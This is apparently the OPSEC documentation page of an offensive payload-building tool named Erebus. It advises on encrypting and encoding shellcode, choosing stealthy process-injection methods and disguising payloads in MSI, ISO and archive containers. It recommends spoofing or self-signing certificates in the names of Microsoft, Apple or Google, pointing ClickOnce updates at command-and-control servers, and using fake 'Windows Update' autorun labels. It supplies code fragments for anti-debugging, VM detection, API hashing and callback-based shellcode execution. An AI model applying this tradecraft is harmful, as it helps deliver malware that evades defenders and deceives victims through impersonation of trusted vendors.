+++
title = "OPSEC"
chapter = false
weight = 15
pre = "<b>2. </b>"
+++

## Obfuscation & Security Considerations

### Shellcode Obfuscation (Shellcrypt)

The Erebus wrapper uses a Python-based obfuscation pipeline to transform raw shellcode through multiple stages:

#### Compression Methods

**LZNT1**
- NTLM compression algorithm used by Windows
- Reduces payload size significantly
- Compressed data is less recognizable as shellcode
- Decompression happens at runtime in the loader

**RLE (Run-Length Encoding)**
- Encodes consecutive identical bytes
- Best for shellcode with repeated patterns
- Moderate size reduction
- Fast decompression

**NONE**
- No compression applied
- Useful when payload is already small
- Reduces complexity in loader

**Recommendation**: LZNT1 for maximum obfuscation and size reduction, RLE for balance between size and speed.

#### Encryption Methods

**AES128_CBC**
- 128-bit key AES in Cipher Block Chaining mode
- Fast encryption/decryption
- IV (Initialization Vector) is generated per build
- Moderate security level

**AES256_CBC**
- 256-bit key AES in Cipher Block Chaining mode
- Stronger than AES128, slightly slower
- Recommended for higher security requirements
- Good balance of security and performance

**AES256_ECB**
- Electronic Codebook mode (stateless)
- Less secure than CBC mode
- Predictable patterns possible in encrypted output
- **Not recommended for operational use**

**CHACHA20**
- Stream cipher with 256-bit key
- No mode specification needed (inherent property)
- Good performance on low-end systems
- Modern alternative to AES
- Provides authenticated encryption properties

**SALSA20**
- Stream cipher variant of CHACHA20
- 256-bit key
- Excellent performance
- Suitable for all systems

**XOR**
- Simple single-byte XOR encryption
- Minimal performance overhead
- **Weak security - use only for testing or simple obfuscation**
- Single key byte used repeatedly

**XOR_COMPLEX**
- Multi-byte rotating XOR encryption
- More secure than simple XOR
- Still weaker than AES but better than XOR
- Low performance impact

**Recommendation**: AES256_CBC for strong security, CHACHA20/SALSA20 for performance-critical scenarios.

#### Encoding Methods

**ALPHA32**
- Encodes data using alphanumeric characters only
- Bypasses simple signature detection
- Approximately 1.33x size expansion
- Output suitable for various contexts

**ASCII85**
- Base85 encoding
- More compact than BASE64
- Approximately 1.25x size expansion
- Printable ASCII output

**BASE64**
- Standard Base64 encoding
- Most common encoding
- Approximately 1.33x size expansion
- Widely supported

**WORDS256**
- Encodes to English words
- Evades pattern-based detection
- Significant size expansion
- Human-readable but unusual

**NONE**
- No encoding applied
- Raw encrypted bytes
- Smallest output size
- May trigger signature detection

**Recommendation**: BASE64 for simplicity, ALPHA32 for evasion, or NONE if final container provides additional protection.

#### Output Formats

**C** - C/C++ Array Format
```c
unsigned char shellcode[] = {
    0x48, 0x89, 0xe5, 0x48, ...
};
```
- Used for native loaders (Shellcode Loader)
- Compatible with C/C++ compilation
- Direct inclusion in source

**CSharp** - C# Byte Array Format
```csharp
byte[] shellcode = new byte[] {
    0x48, 0x89, 0xe5, 0x48, ...
};
```
- Used for .NET loaders (ClickOnce)
- Native C# syntax

**Python/PowerShell/VBA/VBScript/JavaScript** - Language-specific array format
- Useful for script-based execution
- Language-native syntax
- For advanced payload staging

**Nim/Go/Rust/Zig** - Language-specific formats
- For alternative language runtimes
- Native language array syntax

**Raw** - Binary blob (no formatting)
- Used when shellcode will be read as binary
- No array wrapping
- Smallest output size

**Recommendation**: Use C for Shellcode Loader, CSharp for ClickOnce, Raw for binary storage.

### Obfuscation Chaining Example

**High Security Configuration:**
1. **Compression**: LZNT1 (size reduction + obfuscation)
2. **Encryption**: AES256_CBC (strong cryptography)
3. **Encoding**: ALPHA32 (alphanumeric obfuscation)
4. **Custom Key**: User-supplied or generated (not default)

**Result**: Shellcode is compressed, encrypted with 256-bit AES, then encoded to alphanumeric characters. Extremely difficult to detect or analyze without decryption key.

**Performance-Optimized Configuration:**
1. **Compression**: NONE
2. **Encryption**: CHACHA20 (fast stream cipher)
3. **Encoding**: NONE
4. **Custom Key**: Generated

**Result**: Minimal overhead while maintaining encryption.

---

## MalDocs (Excel VBA) OPSEC Considerations

**Build Step**
- The build pipeline logs MalDoc generation under the `Creating MalDoc` step.

**Macro Security Prompts**
- Office often blocks macros from the internet (Mark-of-the-Web).
- Users may see warnings requiring explicit enablement.

**File Type & Extension**
- Prefer XLSM/XLAM for macro-enabled content.
- Ensure the file name and content appear legitimate to reduce suspicion.

**Execution Triggers**
- AutoOpen/OnClose/OnSave triggers can be noisy if used indiscriminately.
- Consider user workflow to avoid unexpected macro execution.

**Evasion & Visibility**
- VBA obfuscation may help evade simple signature-based detection.
- Over-obfuscation can increase anomaly scores in modern detections.

**Operational Risk**
- Macro-based delivery is high-visibility in monitored environments.
- Use only when tradecraft and campaign constraints allow.

---

## Injection Methods & OPSEC

### Shellcode Loader Injection Types (C++)

**Type 1: NtQueueApcThread**
- **Method**: APC injection to suspended thread
- **Scope**: Remote process injection
- **Detection**: May trigger on APC queue monitoring
- **OPSEC**: Monitor for thread suspension events, APC queue activity
- **Stealth**: Moderate - creates suspended thread which is visible
- **Reliability**: High
- **Recommended Targets**: svchost.exe, spoolsv.exe

**Type 2: NtMapViewOfSection**
- **Method**: Section mapping injection
- **Scope**: Remote process injection
- **Detection**: Advanced - checks for mapped sections
- **OPSEC**: Monitor kernel calls, section object activity
- **Stealth**: High - legitimate Windows API usage
- **Reliability**: High on modern Windows
- **Recommended Targets**: explorer.exe, winlogon.exe

**Type 3: CreateFiber**
- **Method**: Fiber-based self-injection
- **Scope**: Self-injection (same process)
- **Detection**: Low - fibers are uncommon
- **OPSEC**: Less suspicious than remote injection
- **Stealth**: Very High - legitimate Windows mechanism
- **Reliability**: High
- **Recommended Targets**: Self-injection only

**Type 4: EarlyCascade (Early Bird)**
- **Method**: APC injection before process initialization
- **Scope**: Remote process injection
- **Detection**: Advanced - before execution monitoring may miss it
- **OPSEC**: Injects before main thread begins
- **Stealth**: Very High - injection happens before typical monitoring
- **Reliability**: High on unprepared systems
- **Recommended Targets**: cmd.exe, powershell.exe, rundll32.exe

**Type 5: PoolParty**
- **Method**: Worker Factory thread pool injection
- **Scope**: Remote process injection
- **Detection**: Very Advanced - thread pool monitoring required
- **OPSEC**: Uses worker factory mechanism
- **Stealth**: Very High - uncommon detection
- **Reliability**: High on modern Windows versions
- **Recommended Targets**: svchost.exe, services.exe

**Recommendation**: Use EarlyCascade or PoolParty for maximum stealth, CreateFiber for self-injection scenarios.

### ClickOnce Injection Methods (C#/.NET)

**createfiber**
- **Scope**: Self-injection
- **Reliability**: High
- **OPSEC**: Same process context, no remote operation
- **Stealth**: High - legitimate Windows API
- **Best For**: When ClickOnce execution context is acceptable

**earlycascade**
- **Scope**: Remote injection
- **Stealth**: Very High - early injection avoids monitors
- **Reliability**: Very High
- **OPSEC**: Excellent - injection before typical detection
- **Best For**: Maximum stealth in remote execution

**poolparty**
- **Scope**: Remote injection
- **Stealth**: Very High
- **Reliability**: High on modern systems
- **OPSEC**: Uncommon detection signature
- **Best For**: Advanced evasion requirements

**classic**
- **Scope**: Remote injection
- **Stealth**: Moderate - CreateRemoteThread is well-monitored
- **Reliability**: Very High on all Windows versions
- **OPSEC**: Most detectable of remote methods
- **Best For**: Compatibility when stealth isn't critical

**enumdesktops**
- **Scope**: Self-injection via callback
- **Stealth**: Very High - abuses legitimate API
- **Reliability**: Moderate - desktop enumeration required
- **OPSEC**: Unusual code path
- **Best For**: Special scenarios needing callback injection

**Recommendation**: earlycascade for remote execution, createfiber for in-process.

---

## Container Specifications

### ISO (Optical Media)

**Characteristics:**
- Bootable optical media format
- Windows autorun.inf support (when enabled)
- Max single file: 2.2GB (single layer)
- Compression: None (filesystem doesn't compress)
- Typical Use: Physical distribution, USB mount simulation

**OPSEC Considerations:**
- Appears legitimate on user desktop
- Autorun.inf execution requires user interaction or policy bypass
- Volume label can be customized for social engineering
- File timestamps preserved from build
- No metadata about payload contents

**Configuration:**
- **Volume ID**: Displayed in Explorer (e.g., "EREBUS", "WINDOWS_UPDATE")
- **Autorun**: Enable/disable automatic execution
- **Backdoor Mode**: Modify existing ISO to add payload
- **Recommendation**: Use realistic volume IDs for social engineering (WINDOWS_UPDATE, DRIVER_INSTALL, etc.)

### 7z Archive

**Characteristics:**
- Excellent compression ratio (20-50% of original)
- Strong encryption support (AES-256)
- Smaller distribution size
- Typical Use: Email distribution, web hosting

**OPSEC Considerations:**
- Highly compressed (detectable signature)
- Password-protected variant adds another layer
- File timestamps can be obfuscated
- 7z is less common than ZIP (may trigger detection)
- Archive structure visible to scanners

**Configuration:**
- **Compression Level**: 0-9 (default 9 = max)
- **Password**: Optional encryption
- **Recommendation**: Use maximum compression + password for sensitive distributions

### ZIP Archive

**Characteristics:**
- Standard format, widely supported
- Compression (varies by method)
- Encryption option (newer specs)
- Typical Use: Standard distribution, email-safe

**OPSEC Considerations:**
- Most common archive format (less suspicious)
- Internal file listing visible without extraction
- Older encryption standards may be cracked
- Compression reduces signature footprint
- Timestamps preserved unless sanitized

**Configuration:**
- **Compression Level**: 0-9
- **Password**: Optional protection
- **Recommendation**: Use password-protected ZIP for distribution

### MSI (Windows Installer)

**Characteristics:**
- Windows installer package format
- Appears as legitimate application installer
- Can request administrator privileges
- Database format (structured)
- Typical Use: Silent installation campaigns

**OPSEC Considerations:**
- Appears highly legitimate on Windows
- Can be installed silently with proper parameters
- Admin elevation possible without UAC prompts (with specific conditions)
- Execution context is SYSTEM when installing to Machine scope
- Digital signature support for appearance of legitimacy
- Rollback capability (uninstall) may be expected

**Configuration:**
- **Product Name**: Application name shown to user
- **Manufacturer**: Company name (social engineering opportunity)
- **Install Scope**: 
  - User = AppData installation (no admin required)
  - Machine = Program Files installation (may require admin)
- **Recommendation**: Use "Microsoft Corporation" or legitimate-sounding names

---

## Code Signing Strategy

### Self-Signed Certificates

**Configuration:**
```
Common Name (CN): Organization or product name
Organization Name: Legitimate-sounding organization
Valid Period: Typically 1-3 years
Key Size: 2048-4096 bits
```

**OPSEC Consideration:**
- Appears legitimate to user at first glance
- Browser warnings on execution (if unsigned)
- Can bypass some application whitelisting if configured properly
- Certificate details visible in properties
- No actual certification authority verification

**Recommendation**: Use recognizable company names (Microsoft, Apple, Google) with realistic certificate details.

### Spoofed Certificates

**Method**: Clone certificate details from legitimate website
- Extracts details from target URL's SSL certificate
- Applies details to self-signed cert
- Creates appearance of legitimacy

**OPSEC Consideration:**
- More convincing than generic self-signed
- Details match real organization (on surface)
- Deep inspection reveals self-signature
- Good for casual inspection scenarios

**Recommendation**: Spoof well-known companies that align with payload context.

### Provided Certificates

**Method**: Supply legitimate certificate (PFX/P12)
- Requires actual code signing certificate (paid or obtained)
- Provides genuine digital signature
- Full chain of trust from certification authority

**OPSEC Consideration:**
- Completely legitimate from cryptographic perspective
- Requires certificate procurement
- Revocation possible if certificate is compromised
- Best operational security
- Can be tracked by certificate authority

**Recommendation**: For high-value operations or when budget allows.

### Certificate Bypass Considerations

- **User Account Control (UAC)**: Unsigned binaries trigger UAC prompt
- **SmartScreen**: Reputational filter, learns over time
- **Virus Total**: Scans signed binaries too
- **Whitelisting**: AppLocker, DeviceGuard aware of signature
- **Code Integrity**: Kernel-level validation on Windows Defender

**Best Practice**: Sign all payloads - absence of signature is suspicious.

---

## Trigger Mechanisms

### LNK (Shortcut) Triggers

**Mechanism:**
- Creates Windows .lnk (shortcut) file
- Executes specified binary with command-line arguments
- Can chain to decoy file execution

**OPSEC Considerations:**
- Shortcut properties visible to user
- Execution traced in Windows Event Logs
- Target path and arguments stored in clear
- No file system changes needed (non-intrusive)
- Timing of execution controlled

**Configuration:**
- **Trigger Binary**: Executable to run (e.g., conhost.exe)
- **Trigger Command**: Arguments passed (e.g., cmd.exe /Q /c payload.exe | decoy.pdf)
- **Decoy File**: Optional file executed after payload for appearance

**Examples:**
```
Binary: C:\Windows\System32\conhost.exe
Command: --headless cmd.exe /Q /c payload.exe

Binary: C:\Windows\System32\notepad.exe
Command: C:\path\to\decoy.pdf
(Executes notepad with decoy.pdf silently in background)
```

**Recommendation**: Use system binaries as trigger binary to appear legitimate. Chain to decoy execution for user experience.

### BAT (Batch Script) Triggers

**Mechanism:**
- Creates Windows batch script (.bat)
- Executes commands through cmd.exe
- Obfuscates complex command sequences

**OPSEC Considerations:**
- Batch script source visible to defenders
- Execution traced in command line logs
- Obfuscation needed for payload path/commands
- Environment variables can hide paths
- Timing delays controllable via batch syntax

**Configuration:**
- **Command**: Batch commands to execute
- **Decoy**: Optional legitimate action to perform
- **Delays**: Staged execution timing

**Examples:**
```batch
@echo off
setlocal enabledelayedexpansion
start "" payload.exe
timeout /t 2
start "" decoy.pdf
```

**Recommendation**: Combine with legitimate batch logic, use environment variables for obfuscation, chain to decoy execution.

### MSI (Windows Installer) Triggers

**Mechanism:**
- Integrates payload as custom action in MSI database
- Executes during installation process
- Appears as legitimate software installation

**OPSEC Considerations:**
- Elevated privileges possible (depends on scope)
- Execution context can be SYSTEM or User
- Installation process familiar to users
- Progress/completion dialogs provide cover
- Event logs contain installation records
- Silent installation possible with proper parameters

**Configuration:**
- **Custom Action**: Payload execution method
- **Scope**: User or Machine installation level
- **Sequence**: When payload executes (InstallExecuteSequence)
- **Conditions**: Trigger conditions (always, on repair, etc.)

**Examples:**
```
Silent Installation:
msiexec.exe /i setup.msi /quiet /qn

Custom Action Execution:
Payload runs during InstallFinalize phase
Elevated privileges if installed to Machine scope
```

**Recommendation**: Use Machine scope for maximum privileges, name MSI as legitimate product, disable rollback to prevent uninstall.

### ClickOnce Triggers

**Mechanism:**
- Leverages .NET ClickOnce deployment platform
- Uses application manifests for code identity
- Appears as legitimate application deployment

**OPSEC Attack Surface:**
- **Manifest Signing**: Can be unsigned or signed
  - Unsigned: Easier to create, less legitimate appearance
  - Signed: Requires code signing certificate, more legitimate
  - Trusted publisher detection: SmartScreen learns URL reputation
  
- **Deployment Vector**: HTTP/HTTPS with manifest files
  - Must be served via web server or shared network location
  - Manifest files specify application assembly location
  - Hash verification prevents tampering (if properly calculated)
  
- **Execution Context**: Runs as current user
  - No privilege escalation built-in
  - Inherits user token and permissions
  - AppData isolated storage possible
  
- **Detection Vectors**:
  - Deployment manifest (.application) files
  - Application manifest (.exe.manifest) with assembly info
  - Cached application files in LocalAppData\Apps
  - Network traffic to manifest/assembly URLs
  - Process execution with ClickOnce markers

**Advanced ClickOnce Hardening:**

1. **Manifest Hash Verification**:
   - Manifests include SHA256 hashes of assemblies
   - Tampering detection prevents modified payloads
   - Proper calculation is critical for functionality
   
2. **Self-Updating Capability**:
   - ClickOnce includes update checking
   - Can check for updates on each execution
   - Provides command & control capability
   - Update checks go to specified update URL
   
3. **ClickOnce Cache Evasion**:
   - Default cache location: `%LOCALAPPDATA%\Apps`
   - Defender may scan cache during execution
   - Cache cleanup on uninstall (if not prevented)
   - Location is standard (easily discoverable)

**Custom ClickOnce Hardening Approaches:**

- **Manifest Signing**: Sign deployment manifests with legitimate certificate
- **Custom Update Server**: Point update checks to command & control infrastructure
- **Environmental Checks**: Include checks in manifests for analysis detection
- **URL Spoofing**: Use URLs mimicking legitimate cloud services
- **Cache Persistence**: Modify cache to persist across logout/login

**Recommendation**: Use signed manifests with realistic publisher identity, configure update URL for command & control, combine with Code Signing strategy for maximum legitimacy.

**Detection Evasion for ClickOnce:**
- Sign manifests to bypass SmartScreen
- Use custom update server for C2 integration
- Reference legitimate-sounding assembly URLs
- Configure cache retention policies
- Disable rollback to prevent uninstall
- Use custom injection method matching .NET environment

---

## Custom Hardening Guide

### Loader-Level Hardening

Custom modifications to C++ Shellcode Loader and .NET ClickOnce loader can significantly increase OPSEC and detection evasion:

#### C++ Shellcode Loader Hardening

**1. Anti-Analysis Detection**

Add dynamic analysis detection before payload execution:

```cpp
// Check for debugger presence
BOOL isDebugger = IsDebuggerPresent();
if (isDebugger) {
    // Exit gracefully or infinite loop
    ExitProcess(1);
}

// Check for common analysis tools
CHAR szPath[MAX_PATH];
GetModuleFileNameA(NULL, szPath, MAX_PATH);
if (strstr(szPath, "system32") == NULL) {
    // Running from non-system location - likely analysis
    ExitProcess(1);
}

// Check for VirtualBox/VMware
LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
    "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, NULL);
if (result == ERROR_SUCCESS) {
    ExitProcess(1);  // Running in VirtualBox
}

// Check for WMI-based VM detection
IWbemServices *pSvc = NULL;
// Attempt WMI connection and query BIOS info for VM signatures
// If detected, exit
```

**2. ASLR and DEP Awareness**

Ensure loader respects Address Space Layout Randomization:

```cpp
// Query kernel for ASLR availability
UINT uAddressSpacing;
GetProcessMitigationPolicy(GetCurrentProcess(), 
    ProcessASLRPolicy, &uAddressSpacing, sizeof(uAddressSpacing));

// When injecting, calculate relocations if payload uses relative addressing
// ASLR means injected shellcode base address is not fixed
if (uAddressSpacing) {
    // Calculate offset between loaded address and expected base
    DWORD dwOffset = (DWORD)pShellcode - EXPECTED_BASE;
    // Apply relocations to shellcode if needed
}
```

**3. Obfuscation of Loader Itself**

Add code obfuscation to loader binary:

```cpp
// Use XOR or RC4 to obfuscate sensitive strings
const BYTE obfuscatedKey[] = { 0xAB, 0xCD, 0xEF, ... };

CHAR szTargetProcess[MAX_PATH];
XorDecode(szTargetProcess, obfuscatedKey, encrypted_process_name);

// Resolve Windows APIs dynamically to avoid import table
typedef VOID* (*pCreateFileW)(LPCWSTR, DWORD, DWORD, SECURITY_ATTRIBUTES*, DWORD, DWORD, HANDLE);
pCreateFileW CreateFileWPtr = (pCreateFileW)GetProcAddressX(
    GetModuleHandleX("kernel32.dll"), "CreateFileW", obfuscatedKey);

// Function resolution is traced back to string hashing instead of plain text
DWORD HashApiName(const CHAR* szName) {
    DWORD dwHash = 0;
    while (*szName) dwHash = ((dwHash << 5) + dwHash) ^ *szName++;
    return dwHash;
}
```

**4. Custom Process Injection Variants**

Beyond standard injection types, implement custom variants:

```cpp
// Variant 1: Indirect syscall injection (syscall-less)
// Use legitimate APIs that internally call syscalls
// Reduces direct syscall signature

// Variant 2: Callback-based injection
// Use window message callbacks or timer callbacks
SetTimer(hwndTarget, 0, 0, (TIMERPROC)pShellcode);

// Variant 3: COM-based injection
// Use COM interfaces to execute code indirectly
// Less monitored than direct injection

// Variant 4: Exception handler injection
// Set up vectored exception handlers that point to shellcode
AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)pShellcode);
```

**5. Stealth Spawning**

Replace obvious `CreateProcessA/CreateProcessW` with stealthier alternatives:

```cpp
// Instead of CreateProcessW (heavily monitored):
// Use WMI Process creation through COM
CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_ALL, 
    IID_IWbemLocator, (void**)&pLocator);
// Query Win32_Process class and call Create method

// Or use ShellExecute with RUNAS verb for elevated spawning
ShellExecuteEx(&ShExecInfo); // Avoids CreateProcessW hooks

// Or use scheduled task creation for delayed execution
ITaskService *pService = NULL;
CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_ALL, 
    IID_ITaskService, (void**)&pService);
// Create task with embedded shellcode trigger
```

#### .NET ClickOnce Loader Hardening

**1. Assembly Obfuscation**

Apply obfuscation to .NET payload assembly:

```csharp
// Use reflection to dynamically load obfuscated methods
Type type = Type.GetType("Namespace.ClassName", false, true);
MethodInfo method = type.GetMethod("HiddenMethod", 
    BindingFlags.NonPublic | BindingFlags.Static);
object result = method.Invoke(null, parameters);

// String encryption for sensitive values
private static string DecryptString(byte[] encryptedData, string key) {
    using (var aes = Aes.Create()) {
        aes.Key = Encoding.UTF8.GetBytes(key);
        // Decrypt and return
    }
}

private static readonly string TargetProcess = DecryptString(new byte[] { ... }, "key");
```

**2. Reflection-Based API Invocation**

Avoid direct P/Invoke which creates import tables:

```csharp
// Instead of: [DllImport("kernel32.dll")]
// Use reflection and GetProcAddress

public static IntPtr GetProcAddressByHash(string libraryName, uint apiHash) {
    IntPtr hModule = LoadLibraryByName(libraryName);
    IntPtr pFunc = IntPtr.Zero;
    
    // Enumerate exports and match by hash
    foreach (var exportName in EnumerateModuleExports(hModule)) {
        if (HashString(exportName) == apiHash) {
            pFunc = GetProcAddress(hModule, exportName);
            break;
        }
    }
    return pFunc;
}

// Call functions dynamically
IntPtr pCreateProcess = GetProcAddressByHash("kernel32.dll", 0x12345678);
// Invoke through Marshal.GetDelegateForFunctionPointer
```

**3. ClickOnce-Specific Hardening**

Leverage ClickOnce platform for evasion:

```csharp
// Access ClickOnce deployment info
if (ApplicationDeployment.IsNetworkDeployed) {
    // Determine if updates are available
    // Can implement custom update checking to C2
    UpdateCheckInfo info = ApplicationDeployment.CurrentDeployment.CheckForDetailedUpdate();
    
    // Abort if analysis environment detected
    // Legitimate applications check for updates regularly
    
    // Store payloads in ClickOnce cache
    string cacheDir = ApplicationDeployment.CurrentDeployment.DataDirectory;
    // Files in cache persist across user logout
}

// Use ClickOnce configuration for persistence
string dataDir = ApplicationDeployment.CurrentDeployment.DataDirectory;
// Store agent executable here for service installation
// Survives application uninstall if cache is retained
```

**4. Memory Protection**

Use Windows memory protection mechanisms:

```csharp
// Mark memory regions as non-executable initially
// Decrypt shellcode only when needed
byte[] encryptedShellcode = ReadEmbeddedResource("payload.bin");
byte[] decrypted = DecryptPayload(encryptedShellcode);

// Allocate non-executable memory
IntPtr pPayload = Marshal.AllocHGlobal(decrypted.Length);
Marshal.Copy(decrypted, 0, pPayload, decrypted.Length);

// Make executable only during injection
VirtualProtect(pPayload, (uint)decrypted.Length, 0x40, out uint old); // PAGE_EXECUTE_READWRITE

// Execute
delegate_CreateFiber cfDelegate = (delegate_CreateFiber)Marshal.GetDelegateForFunctionPointer(
    pCreateFiber, typeof(delegate_CreateFiber));

// Restore to non-executable after injection
VirtualProtect(pPayload, (uint)decrypted.Length, old, out uint _);
```

**5. Anti-Debugging Techniques**

Add runtime checks to detect analysis:

```csharp
// Check for debugger
if (Debugger.IsAttached) {
    Environment.Exit(1);
}

// Check for common analysis tools via process list
var processes = Process.GetProcesses();
string[] suspiciousProcesses = { "ida64", "x32dbg", "x64dbg", "cheatengine", "procmon" };
foreach (var proc in processes) {
    if (suspiciousProcesses.Contains(proc.ProcessName.ToLower())) {
        Environment.Exit(1);
    }
}

// Check for debugging via PEB
bool IsDebuggerPresent() {
    IntPtr peb = GetPEB();
    byte debugged = Marshal.ReadByte(IntPtr.Add(peb, 0x02));  // BeingDebugged flag
    return debugged != 0;
}
```

### Container-Level Hardening

**1. MSI Custom Actions**

Embed multiple execution paths in MSI:

```xml
<InstallExecuteSequence>
    <!-- Condition-based execution -->
    <Custom Action="ExecutePayload" After="InstallFinalize">
        NOT REMOVE AND NOT Installed
    </Custom>
    
    <!-- Alternative execution path for repair -->
    <Custom Action="ExecutePayloadRepair" After="InstallFinalize">
        REINSTALL OR UPGRADE
    </Custom>
</InstallExecuteSequence>

<!-- Custom actions can execute executables, scripts, or DLLs -->
<CustomAction Id="ExecutePayload" Return="ignore"
    FileKey="PayloadExe" ExeCommand="-hidden" />
```

**2. ISO Autorun Obfuscation**

Create deceptive autorun scenarios:

```ini
[autorun]
; Windows displays this label
label=Windows Update
; Icons mimicking system icons
icon=system32.dll,0

; Multiple execution paths for system versions
open=setup.exe
openW98=legacy_setup.exe
; This entry runs on shell context
shell\install\command=powershell.exe -c "& '\Payload\run.exe'"
```

**3. Archive Self-Extraction**

Use SFX (self-extracting) archives with execution logic:

```ini
; 7z SFX configuration for self-extracting archive
Title="System Update"
BeginPrompt="Installing system updates..."
Progress=yes
ExecuteFile=update.exe
ExecuteParameters=/silent
; Archives extract to temporary location and execute
```

### Code Signing Hardening

**1. Timestamp Authorities**

Use legitimate timestamp authorities in signatures:

```powershell
$cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.Thumbprint -eq "ABC123..." }

# Sign with timestamp authority to increase signature legitimacy
Set-AuthenticodeSignature -FilePath "payload.exe" `
    -Certificate $cert `
    -TimestampServer "http://timestamp.verisign.com/scripts/timstamp.dll"
    
# Timestamps make signature appear more trustworthy
# Signature remains valid even after certificate expiration (if timestamped)
```

**2. Multiple Signature Layers**

Layer signatures for additional legitimacy:

```powershell
# First signature with organization certificate
Set-AuthenticodeSignature -FilePath "payload.exe" -Certificate $orgCert

# Optionally add a secondary counter-signature
# Some scenarios require multiple signatures for compatibility
```

---

## Recommended OPSEC Configurations by Scenario

### **High-Risk Operation (Maximum Stealth)**
- **Shellcode**: AES256_CBC + LZNT1 + ALPHA32
- **Injection Method**: PoolParty (C++) or earlycascade (C#/.NET)
- **Certificate**: Legitimate or highly-spoofed
- **Container**: MSI with legitimate metadata
- **Trigger**: MSI custom action with conditional execution
- **Loader Hardening**: Full anti-analysis, memory protection, custom injection variants
- **Additional**: Code signing with timestamp authority

### **Medium-Risk Operation (Balanced Approach)**
- **Shellcode**: AES256_CBC + LZNT1
- **Injection Method**: NtMapViewOfSection (C++) or earlycascade (C#/.NET)
- **Certificate**: Spoofed certificate matching context
- **Container**: ZIP with password or MSI
- **Trigger**: LNK with system binary or MSI
- **Loader Hardening**: Anti-debugging, API obfuscation
- **Additional**: Standard code signing

### **Quick Deployment (Speed Priority)**
- **Shellcode**: AES128_CBC + RLE
- **Injection Method**: CreateFiber (C++) or createfiber (C#/.NET)
- **Certificate**: Self-signed with realistic organization name
- **Container**: ZIP without password
- **Trigger**: BAT script or LNK
- **Loader Hardening**: Minimal (focus on functionality)
- **Additional**: Self-signed certificate only

---

## Detection Evasion Summary

| Technique | Detection Risk | OPSEC Score |
|-----------|---------------|------------|
| Single XOR encryption | Very High | ★☆☆☆☆ |
| AES128 + BASE64 | Medium | ★★★☆☆ |
| AES256_CBC + LZNT1 | Low | ★★★★☆ |
| CHACHA20 + ALPHA32 | Low | ★★★★☆ |
| CreateFiber (self-inject) | Very Low | ★★★★★ |
| NtQueueApcThread | Medium | ★★★☆☆ |
| EarlyCascade injection | Very Low | ★★★★★ |
| PoolParty injection | Very Low | ★★★★★ |
| Self-signed cert | High | ★★☆☆☆ |
| Spoofed cert | Medium | ★★★☆☆ |
| Legitimate cert | Very Low | ★★★★★ |

**Highest OPSEC Configuration:**
- Shellcode: AES256_CBC + LZNT1 + ALPHA32
- Injection: EarlyCascade or PoolParty
- Certificate: Spoofed or Legitimate
- Container: MSI with legitimate metadata
- Trigger: System binary with normal arguments

**Default Safer Configuration** (balanced):
- Shellcode: AES256_CBC + LZNT1
- Injection: Type 2 (NtMapViewOfSection)
- Certificate: Self-signed with realistic CN
- Container: ZIP with password
- Trigger: explorer.exe with clean command line
